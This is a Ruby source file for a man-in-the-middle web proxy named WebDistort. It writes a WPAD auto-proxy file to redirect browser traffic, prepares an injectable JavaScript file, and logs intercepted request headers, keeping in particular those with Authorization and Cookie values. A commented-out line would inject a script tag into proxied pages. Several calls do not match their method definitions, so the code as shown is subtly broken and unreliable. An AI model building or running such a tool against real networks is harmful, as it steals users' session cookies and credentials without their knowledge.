#!/usr/bin/ruby

class WebDistort

	class Proxy
		@proxy_ip = ''
		@proxy_port = ''

		@http_root = ''
		@http_ip = ''
		@http_port = ''

		@header_file = nil
		@data_dir = Dir::pwd + '/saved'


		def modify_body (body, http_ip, http_port, http_root)
		#  js_file = "http://" + http_ip + ":" + http_port.to_s + "/inject.js"
		#  body.gsub(s%</head>%<script language='javascript' src='${JS_URL}'></script></head>%i)
		  return body
		end

		def initialize(options)
			@data_dir = options['data_dir']
			@http_root = options['http_root']
		
			wpad_template_file = File.open(@http_root + "/wpad.dat.tpl", "r")
			wpad_data = wpad_template_file.read
			wpad_template_file.close

			wpad_file = File.open(@http_root + "/wpad.dat", "w")
			wpad_file.syswrite(wpad_data.gsub(/proxyIpAddr/, @proxy_ip).gsub(/proxyPort/, @proxy_port))
			wpad_file.close

			js_template_file = File.open(@http_root + "/inject.js.tpl", "r")
			js_data = js_template_file.read
			js_template_file.close

			js_file = File.open(@http_root + "/inject.js", "w")
			js_file.syswrite(js_data.gsub(/proxyIpAddr/, @proxy_ip).gsub(/httpPort/, @http_port))
			js_file.close
	
			start_proxy
		end

		def handle_contents(request, response, data_dir, grab_all_headers)
			if response.content_type =~/text/ || response.content_type =~/javascript/
				if $header_file == nil
				  $header_file = File.open(data_dir + "/headers.txt", "a")
				end
					      
				header_output = request.request_line
				request.raw_header.each {|line| header_output = header_output + line}
				header_output = header_output + "-"*70+"\n"
				  
		    if grab_all_headers || header_output =~ /Authorization/ || header_output =~ /Cookie/
		  		count =  $header_file.syswrite(header_output);	
		    end

		    return modify_body(response.body)
		  else
		    return response.body
			end
		end


		def start_proxy()
			proxy_logger = WEBrick::Log.new(@data_dir + "/proxy.log")
		  	access_log_file = File.open(@data_dir + "/proxy_access.log", "a")
		  	access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]


			proxy = WEBrick::HTTPProxyServer.new(
				:Logger => proxy_logger,
		   		:AccessLog => access_logger,
				:Port => @proxy_port,
			    	:RequestCallback => Proc.new{|req,res| 
				      if req.request_method == "CONNECT" 
					# Handle SSL connections
				      end
				      req.header.delete('accept-encoding') },
		   		:ProxyContentHandler => lambda {|request, response|
					response.body = handle_contents(request, response)})
		
					['INT', 'TERM', 'KILL'].each {|signal|
					  	trap(signal) { proxy.shutdown ; access_log_file.close }
					}
			proxy.start
		end
	end
end
